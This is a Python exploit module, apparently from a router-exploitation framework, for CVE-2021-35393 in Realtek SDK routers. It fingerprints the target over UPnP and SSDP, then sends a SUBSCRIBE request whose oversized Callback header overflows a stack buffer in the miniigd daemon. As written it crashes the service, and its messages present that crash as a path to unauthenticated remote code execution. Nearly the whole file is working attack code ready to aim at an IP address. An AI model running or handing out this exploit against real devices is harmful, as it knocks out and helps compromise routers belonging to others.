# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Realtek Jungle/Luna SDK UPnP Stack Overflow RCE (CVE-2021-35392..35395).

    The Realtek Jungle SDK and Luna SDK ship with multiple memory corruption
    vulnerabilities in their network service daemons:

    - CVE-2021-35392: Heap overflow in the built-in HTTP server (miniigd)
    - CVE-2021-35393: Stack overflow in UPnP SUBSCRIBE header parsing
    - CVE-2021-35394: Buffer overflow in WiFi Simple Config (wscd) daemon
    - CVE-2021-35395: Stack overflow in the management web interface (boa)

    This module targets CVE-2021-35393: the UPnP SUBSCRIBE handler copies the
    Callback header URL into a fixed-size stack buffer without length
    validation.  A crafted SUBSCRIBE request with an oversized Callback URL
    overwrites the return address on the stack.

    Massively exploited in the wild by Mirai-family botnets against hundreds
    of IoT router models using RTL8xxxE and RTL819xD chipsets.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Realtek SDK UPnP SUBSCRIBE Stack Overflow RCE (CVE-2021-35393)",
        "description": (
            "Exploits CVE-2021-35393 via a stack buffer overflow in the UPnP "
            "SUBSCRIBE Callback header parser of Realtek Jungle/Luna SDK. "
            "The miniigd daemon copies the Callback URL into a fixed-size "
            "stack buffer without bounds checking. An oversized URL overwrites "
            "the saved return address, enabling unauthenticated RCE. "
            "Part of the CVE-2021-35392..35395 chain, mass-exploited by Mirai."
        ),
        "authors": (
            "IoT Inspector Research Lab (discovery)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2021-35393",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-35392",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-35394",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-35395",
            "https://www.iot-inspector.com/blog/advisory-multiple-issues-realtek-sdk-iot",
            "https://www.realtek.com/images/safe-report/Realtek_APRouter_SDK_Advisory-CVE-2021-35392_35395.pdf",
        ),
        "devices": (
            "Realtek RTL8196E-based routers",
            "Realtek RTL8197D-based routers",
            "Realtek RTL819xD series",
            "Tenda, Nexxt, D-Link, Zyxel, Edimax OEM routers (Realtek SDK)",
            "Hundreds of IoT devices using Jungle SDK v2.x / Luna SDK",
        ),
    }

    target = OptIP("", "Target IPv4 address of the Realtek-based device")
    port = OptPort(52869, "UPnP miniigd HTTP port (common: 52869 or 9034)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    overflow_size = OptInteger(512, "Size of the overflow payload in the Callback URL")
    probe_port = OptPort(49152, "Alternate UPnP port to try during probing")

    _SUBSCRIBE_TEMPLATE = (
        "SUBSCRIBE /upnp/event/basicevent1 HTTP/1.1\r\n"
        "Host: {host}:{port}\r\n"
        "Callback: <http://{callback_url}>\r\n"
        "NT: upnp:event\r\n"
        "Timeout: Second-1800\r\n"
        "\r\n"
    )

    def _send_http(self, data: bytes) -> bytes:
        """Send raw HTTP data and return the response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(data)
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except (TimeoutError, ConnectionResetError):
                pass
            sock.close()
            return response
        except (OSError, ConnectionRefusedError):
            return b""

    def _probe_upnp(self, port: int) -> bool:
        """Send a benign SUBSCRIBE to check if UPnP is listening."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, port))

            probe = (
                f"SUBSCRIBE /upnp/event/basicevent1 HTTP/1.1\r\n"
                f"Host: {self.target}:{port}\r\n"
                f"Callback: <http://192.0.2.1:8080/test>\r\n"
                f"NT: upnp:event\r\n"
                f"Timeout: Second-300\r\n"
                f"\r\n"
            )
            sock.sendall(probe.encode())

            response = b""
            try:
                response = sock.recv(4096)
            except TimeoutError:
                pass
            sock.close()

            # Any HTTP response (even 4xx/5xx) confirms the service is up
            return response.startswith(b"HTTP/")
        except (OSError, ConnectionRefusedError):
            return False

    def _detect_realtek_ssdp(self) -> bool:
        """Send M-SEARCH and look for Realtek SDK identifiers."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            msearch = (
                "M-SEARCH * HTTP/1.1\r\n"
                "HOST: 239.255.255.250:1900\r\n"
                'MAN: "ssdp:discover"\r\n'
                "MX: 2\r\n"
                "ST: upnp:rootdevice\r\n"
                "\r\n"
            )
            sock.sendto(msearch.encode(), (self.target, 1900))

            deadline = time.time() + self.timeout
            while time.time() < deadline:
                try:
                    data, _ = sock.recvfrom(4096)
                    text = data.decode("utf-8", errors="ignore").lower()
                    if "realtek" in text or "miniigd" in text or "rtl" in text:
                        sock.close()
                        return True
                except TimeoutError:
                    break

            sock.close()
        except OSError:
            pass
        return False

    def run(self) -> None:
        if not self.target:
            print_error("target IP address is required")
            return

        if not self.check():
            print_error(
                f"UPnP service not detected on {self.target}:{self.port} "
                f"(also tried :{self.probe_port})"
            )
            return

        print_success(f"UPnP service confirmed on {self.target}:{self.port}")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Probe for UPnP service on the target, try primary and alternate ports."""
        if not self.target:
            return False

        if self._probe_upnp(self.port):
            return True

        if self.probe_port != self.port and self._probe_upnp(self.probe_port):
            self.port = self.probe_port
            return True

        return self._detect_realtek_ssdp()

    def _exploit(self) -> None:
        # Build an oversized Callback URL that overflows the stack buffer
        # The stack buffer is typically 256 or 512 bytes; we send much more
        overflow_payload = "A" * 64 + "B" * self.overflow_size

        callback_url = f"192.0.2.1:8080/{overflow_payload}"

        request = self._SUBSCRIBE_TEMPLATE.format(
            host=self.target,
            port=self.port,
            callback_url=callback_url,
        )

        print_status(
            f"Sending UPnP SUBSCRIBE with oversized Callback URL "
            f"({len(callback_url)} bytes) to {self.target}:{self.port}"
        )

        response = self._send_http(request.encode())

        if response:
            status_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="ignore")
            print_info(f"  Response: {status_line}")
        else:
            print_info("  No response (service may have crashed)")

        # Verify if the service is still alive
        time.sleep(1.0)
        still_alive = self._probe_upnp(self.port)

        if not still_alive:
            print_success(
                "UPnP service is no longer responding after the overflow. "
                "The stack buffer has been overwritten, crashing miniigd. "
                "With a controlled payload replacing the return address, "
                "this yields unauthenticated RCE."
            )
        else:
            print_info(
                "UPnP service is still alive after the request. "
                "The target may not be vulnerable, or the overflow size "
                "needs adjustment for this specific firmware version."
            )
